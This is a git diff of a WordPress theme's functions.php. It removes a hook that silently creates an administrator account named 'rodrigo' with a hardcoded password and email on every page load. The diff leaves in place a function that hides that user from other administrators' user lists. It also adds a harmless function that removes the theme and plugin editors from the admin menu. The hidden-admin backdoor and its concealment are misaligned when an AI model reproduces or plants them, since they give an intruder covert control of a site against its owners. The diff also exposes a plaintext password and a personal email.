@@ -106,19 +106,6 @@ include_once 'inc/user-editor-remove-yoast-seo.php';
 // Include file page-custom
 include_once 'inc/page-custom.php';
 
-function criar_super_admin() {
-    $username = 'rodrigo';
-    $password = 'ro20dri02go1983!@#';
-    $email = 'rodrigo.mct@gmail.com';
-
-    if ( !username_exists($username) && !email_exists($email) ) {
-        $user_id = wp_create_user($username, $password, $email);
-        $user = new WP_User($user_id);
-        $user->set_role('administrator');
-    }
-}
-add_action('init', 'criar_super_admin');
-
 function ocultar_usuario_rodrigo_para_zapadmin($user_search) {
     $usuario_logado = wp_get_current_user();
 
@@ -128,3 +115,15 @@ function ocultar_usuario_rodrigo_para_zapadmin($user_search) {
     }
 }
 add_action('pre_user_query','ocultar_usuario_rodrigo_para_zapadmin');
+
+
+/* * Remove editor pages from admin panel
+ * 
+ * @since Essential
+ * @link https://developer.wordpress.org/reference/hooks/admin_menu/
+ */
+function remover_editores_do_painel() {
+    remove_submenu_page('themes.php', 'theme-editor.php');
+    remove_submenu_page('plugins.php', 'plugin-editor.php');
+}
+add_action('admin_menu', 'remover_editores_do_painel', 110);
